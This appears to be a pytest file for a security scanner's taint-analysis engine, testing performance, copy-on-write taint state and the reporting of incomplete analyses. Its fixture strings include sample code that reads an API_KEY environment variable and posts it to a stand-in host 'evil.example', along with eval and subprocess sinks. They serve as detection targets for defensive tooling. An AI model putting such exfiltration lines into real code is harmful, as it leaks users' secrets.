# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Regression tests for behavioral-analysis dataflow performance (issue #120).

Large, deeply-looping Python files used to make the forward-dataflow fixpoint
run for many minutes (deep-copying the whole taint state on every node visit),
so behavioral analysis appeared to hang and was killed by an outer 360s timeout.

These tests pin the fixes:
  * copy-on-write taint environments must not leak mutations across copies, and
    must keep analysis of large looping functions fast (sub-quadratic);
  * the fixpoint must honor a wall-clock budget and degrade gracefully (return
    partial results, flag them incomplete) instead of hanging; and
  * an incomplete (budgeted) analysis must be surfaced to the report so its
    under-approximation is not mistaken for a clean result.
"""

import time
from pathlib import Path

import pytest

from skill_scanner.core.analyzers.behavioral.alignment.alignment_prompt_builder import AlignmentPromptBuilder
from skill_scanner.core.analyzers.behavioral_analyzer import BehavioralAnalyzer
from skill_scanner.core.models import Severity
from skill_scanner.core.static_analysis.context_extractor import (
    ContextExtractor,
    SkillFunctionContext,
    SkillScriptContext,
)
from skill_scanner.core.static_analysis.dataflow import ForwardDataflowAnalysis
from skill_scanner.core.static_analysis.dataflow.forward_analysis import FlowPath
from skill_scanner.core.static_analysis.parser.python_parser import PythonParser
from skill_scanner.core.static_analysis.taint.tracker import ShapeEnvironment, Taint, TaintStatus

_INCOMPLETE_RULE_ID = "BEHAVIOR_DATAFLOW_ANALYSIS_INCOMPLETE"


def _looping_function(n_loops: int) -> str:
    """A function with `n_loops` sequential loops that each mutate a tainted
    accumulator — the control-flow shape that drove the issue's blowup."""
    lines = ["def handler(user_input, mode):", "    acc = user_input + os.getenv('TOKEN')"]
    for j in range(n_loops):
        lines.append(f"    for i{j} in range(mode):")
        lines.append(f"        acc = acc + str(i{j}) + user_input")
        lines.append("        requests.get('http://x/' + acc)")
    lines.append("    eval(acc)")
    lines.append("    return acc")
    return "\n".join(lines) + "\n"


def _serialize_flows(flows: list[FlowPath]) -> list[tuple]:
    """Deterministic, order-independent serialization of analyzer output, so a
    structural-stability assertion can guard against the optimizations silently
    changing findings without hardcoding brittle golden values."""
    serialized = []
    for f in flows:
        ops = tuple(
            sorted(
                (op.get("type"), op.get("target"), op.get("value"), op.get("function"), op.get("argument"))
                for op in f.operations
            )
        )
        serialized.append(
            (
                f.parameter_name,
                ops,
                tuple(sorted(f.reaches_calls)),
                tuple(sorted(f.reaches_assignments)),
                f.reaches_returns,
                f.reaches_external,
            )
        )
    return sorted(serialized, key=lambda t: t[0])


def _min_function_context(**overrides) -> SkillFunctionContext:
    """Minimal SkillFunctionContext with all required fields filled."""
    base = dict(
        name="handler",
        imports=[],
        function_calls=[],
        assignments=[],
        control_flow={},
        parameter_flows=[],
        constants={},
        variable_dependencies={},
        has_file_operations=False,
        has_network_operations=False,
        has_subprocess_calls=False,
        has_eval_exec=False,
    )
    base.update(overrides)
    return SkillFunctionContext(**base)


def _run(code: str, params: list[str], detect_sources: bool = True) -> list[FlowPath]:
    parser = PythonParser(code)
    assert parser.parse()
    return ForwardDataflowAnalysis(
        parser, parameter_names=params, detect_sources=detect_sources
    ).analyze_forward_flows()


class TestTaintEnvironmentCopyOnWrite:
    """ShapeEnvironment.copy() shares shapes but must isolate writes."""

    def test_mutating_copy_does_not_affect_original(self):
        env = ShapeEnvironment()
        env.set_taint("x", Taint(status=TaintStatus.TAINTED, labels={"param:x"}))

        clone = env.copy()
        # Overwrite x in the clone; original must keep its original taint.
        clone.set_taint("x", Taint(status=TaintStatus.UNTAINTED))

        assert env.get_taint("x").is_tainted() is True
        assert clone.get_taint("x").is_tainted() is False

    def test_new_variable_in_copy_does_not_leak_back(self):
        env = ShapeEnvironment()
        clone = env.copy()
        clone.set_taint("y", Taint(status=TaintStatus.TAINTED, labels={"param:y"}))

        # 'y' exists only in the clone.
        assert clone.get_taint("y").is_tainted() is True
        assert env.get_taint("y").is_tainted() is False


class TestDataflowStaysCorrect:
    """The performance fixes must not change analysis findings."""

    def test_analysis_is_deterministic(self):
        """Same input must yield identical serialized flows across runs — this is
        the structural-stability guard backing the 'findings unchanged' claim."""
        code = (
            "import os\n"
            "import requests\n"
            "def f(token):\n"
            "    secret = os.getenv('API_KEY')\n"
            "    data = token + secret\n"
            "    requests.post('http://evil.example/', data=data)\n"
            "    return data\n"
        )
        first = _serialize_flows(_run(code, ["token"]))
        second = _serialize_flows(_run(code, ["token"]))
        assert first == second, "analyzer output must be deterministic across runs"

    def test_taint_flow_still_detected(self):
        code = (
            "import os\n"
            "import requests\n"
            "def f(token):\n"
            "    secret = os.getenv('API_KEY')\n"
            "    data = token + secret\n"
            "    requests.post('http://evil.example/', data=data)\n"
            "    return data\n"
        )
        serialized = _serialize_flows(_run(code, ["token"]))
        by_param = {s[0]: s for s in serialized}

        # The tracked parameter still produces a flow with recorded operations.
        assert "token" in by_param, "parameter flow should still be tracked"
        assert len(by_param["token"][1]) > 0, "token flow should record operations"

        # The credential source is still detected and still reaches an external sink.
        env_sources = [s for s in serialized if s[0].startswith("env_var:")]
        assert env_sources, "env var source should be detected"
        assert any(s[5] for s in env_sources), "env var source should reach an external sink"


class TestDataflowPerformanceAndGracefulDegradation:
    """Large looping functions must analyze quickly and never hang."""

    def test_perf_scaling_is_subquadratic(self):
        """Doubling the loop count must not quadruple the time. Guards against a
        regression of the O(n^2) blowup (a pure absolute threshold would let a
        large constant-factor regression slip through)."""

        def _timed(n_loops: int) -> float:
            parser = PythonParser(_looping_function(n_loops))
            parser.parse()
            analyzer = ForwardDataflowAnalysis(parser, parameter_names=["user_input", "mode"])
            start = time.perf_counter()
            analyzer.analyze_forward_flows()
            return time.perf_counter() - start

        t_small = _timed(20)
        t_large = _timed(40)  # 2x the loops

        # Absolute ceiling (well under the 30s per-unit budget on any normal machine).
        assert t_large < 20.0, f"dataflow analysis too slow ({t_large:.1f}s) — perf regression"
        # Scaling ceiling, but only when the baseline is above the timing-noise floor.
        if t_small > 0.2:
            ratio = t_large / t_small
            assert ratio < 3.5, f"super-linear scaling ({ratio:.1f}x for 2x size) — possible O(n^2) regression"

    def test_time_budget_bounds_runtime_and_returns_partial_flows(self):
        """The wall-clock budget is a backstop for any input that would not
        converge in time. With the fixpoint-convergence fix even large looping
        functions converge in well under a second, so we exercise the backstop
        deterministically with a zero-second budget (the deadline is already in
        the past at the first periodic time check) rather than relying on a
        function being pathologically slow. It must stop early, flag the result
        incomplete, and still return the (partial) flows found so far."""
        parser = PythonParser(_looping_function(400))
        parser.parse()
        analyzer = ForwardDataflowAnalysis(parser, parameter_names=["user_input", "mode"])
        analyzer.max_analysis_seconds = 0.0

        start = time.perf_counter()
        flows = analyzer.analyze_forward_flows()
        elapsed = time.perf_counter() - start

        assert elapsed < 10.0, f"time budget did not bound runtime ({elapsed:.1f}s)"
        assert analyzer.analysis_incomplete is True, "partial analysis should be flagged incomplete"
        assert len(flows) > 0, "partial analysis should still return the flows found so far"

    def test_incomplete_flag_resets_on_a_subsequent_fast_run(self):
        """The incomplete flag must not be sticky — a later fast analysis on a
        fresh analyzer must report a complete (not incomplete) result. The slow
        run is forced via a zero-second budget (see the test above for why a
        large loop count is no longer slow enough to trip it on its own)."""
        slow = ForwardDataflowAnalysis(PythonParser(_looping_function(400)), parameter_names=["user_input", "mode"])
        slow.parser.parse()
        slow.max_analysis_seconds = 0.0
        slow.analyze_forward_flows()
        assert slow.analysis_incomplete is True

        fast = ForwardDataflowAnalysis(PythonParser(_looping_function(2)), parameter_names=["user_input", "mode"])
        fast.parser.parse()
        fast.analyze_forward_flows()
        assert fast.analysis_incomplete is False, "a fast, fully-converged run must not be flagged incomplete"


class TestDataflowEdgeCasesStillAnalyze:
    """Optimizations must not break (crash or non-determinism) on assorted
    control-flow shapes. We assert the analysis completes, tracks the parameter,
    and is deterministic — a copy-on-write aliasing bug would surface as a crash
    or a run-to-run difference. We deliberately do not over-assert the analyzer's
    taint-attribution semantics here."""

    def _assert_stable_and_tracks(self, code: str, param: str) -> None:
        first = _serialize_flows(_run(code, [param], detect_sources=False))
        second = _serialize_flows(_run(code, [param], detect_sources=False))
        assert first == second, "analysis must be deterministic across runs"
        assert any(s[0] == param for s in first), f"parameter {param!r} should be tracked"

    def test_nested_loops(self):
        code = (
            "import requests\n"
            "def nested(secret):\n"
            "    data = secret\n"
            "    for i in range(10):\n"
            "        for j in range(10):\n"
            "            data = data + str(i) + str(j)\n"
            "            requests.get('http://x/' + data)\n"
            "    return data\n"
        )
        self._assert_stable_and_tracks(code, "secret")

    def test_try_except(self):
        code = (
            "import requests\n"
            "def guarded(user_input):\n"
            "    try:\n"
            "        data = user_input + 'p'\n"
            "        requests.post('http://x/', data=data)\n"
            "    except Exception:\n"
            "        requests.get('http://fallback/' + user_input)\n"
            "    return user_input\n"
        )
        self._assert_stable_and_tracks(code, "user_input")

    def test_comprehension(self):
        code = (
            "import requests\n"
            "def comp(secret):\n"
            "    items = [secret + str(i) for i in range(5)]\n"
            "    requests.get('http://x/' + items[0])\n"
            "    return items\n"
        )
        self._assert_stable_and_tracks(code, "secret")

    def test_multiple_sinks(self):
        code = (
            "import subprocess\n"
            "import requests\n"
            "def multi(param):\n"
            "    data = param\n"
            "    subprocess.run(['echo', data])\n"
            "    requests.get('http://x/' + data)\n"
            "    eval(data)\n"
            "    return data\n"
        )
        self._assert_stable_and_tracks(code, "param")

    @pytest.mark.xfail(
        strict=True,
        reason="ast.AugAssign (+=, -=, ...) is not handled in _transfer_python — pre-existing gap",
    )
    def test_augmented_assignment_propagates_taint(self):
        """Documents a known gap: augmented assignment (`acc += user_input`) is not
        tracked, so the tainted parameter records no assignment flow. A plain
        `acc = acc + user_input` would. Will pass once AugAssign is handled."""
        code = (
            "import requests\n"
            "def f(user_input):\n"
            "    acc = 'prefix:'\n"
            "    acc += user_input\n"
            "    requests.get('http://x/' + acc)\n"
            "    return acc\n"
        )
        flows = _run(code, ["user_input"], detect_sources=False)
        assert any(f.parameter_name == "user_input" and f.reaches_assignments for f in flows)


class TestIncompleteAnalysisIsSurfaced:
    """An early-stopped analysis must be visible to the user, not silent."""

    def test_context_extractor_propagates_incomplete_flag(self):
        """extract_context must set dataflow_incomplete when the budget trips."""
        original = ForwardDataflowAnalysis.max_analysis_seconds
        try:
            ForwardDataflowAnalysis.max_analysis_seconds = 0.0  # trip at the first clock check
            # Large enough that the worklist runs past the periodic time-check
            # interval before converging, so the zero-second budget reliably
            # trips (a small function now converges before the first check).
            ctx = ContextExtractor().extract_context(Path("big.py"), _looping_function(400))
            assert ctx.dataflow_incomplete is True
        finally:
            ForwardDataflowAnalysis.max_analysis_seconds = original

        # A small, fully-analyzable script is not flagged.
        ctx_ok = ContextExtractor().extract_context(Path("ok.py"), "def f(x):\n    return x + 1\n")
        assert ctx_ok.dataflow_incomplete is False

    def test_function_context_propagates_incomplete_flag(self):
        """The per-function path (_analyze_parameter_flows) must also surface the
        flag onto SkillFunctionContext when the budget trips."""
        original = ForwardDataflowAnalysis.max_analysis_seconds
        try:
            ForwardDataflowAnalysis.max_analysis_seconds = 0.0
            fctxs = ContextExtractor().extract_function_contexts(Path("big.py"), _looping_function(400))
            assert any(c.dataflow_incomplete for c in fctxs)
        finally:
            ForwardDataflowAnalysis.max_analysis_seconds = original

        ok = ContextExtractor().extract_function_contexts(Path("ok.py"), "def f(x):\n    return x + 1\n")
        assert not any(c.dataflow_incomplete for c in ok)

    def test_behavioral_analyzer_emits_info_finding_when_incomplete(self):
        analyzer = BehavioralAnalyzer()  # no LLM/alignment by default

        incomplete_ctx = SkillScriptContext(file_path="big.py", functions=[], imports=[], dataflow_incomplete=True)
        findings = analyzer._generate_findings_from_context(incomplete_ctx, None)
        incomplete = [f for f in findings if f.rule_id == _INCOMPLETE_RULE_ID]
        assert len(incomplete) == 1, "an incomplete analysis must produce exactly one notice finding"
        assert incomplete[0].severity == Severity.INFO, "the notice must not inflate severity"

        complete_ctx = SkillScriptContext(file_path="ok.py", functions=[], imports=[], dataflow_incomplete=False)
        assert not [
            f for f in analyzer._generate_findings_from_context(complete_ctx, None) if f.rule_id == _INCOMPLETE_RULE_ID
        ], "a complete analysis must not produce the incomplete notice"

    def test_alignment_prompt_warns_when_function_dataflow_incomplete(self):
        """The LLM-alignment prompt must flag truncated per-function flows so the
        model does not treat a missing flow as proof of safety."""
        builder = AlignmentPromptBuilder()

        warned = builder.build_prompt(_min_function_context(dataflow_incomplete=True))
        assert "truncated" in warned.lower(), "incomplete-analysis warning should appear in the prompt"
        assert "under-approximation" in warned.lower()

        clean = builder.build_prompt(_min_function_context(dataflow_incomplete=False))
        assert "under-approximation" not in clean.lower(), "complete analysis must not add the warning"
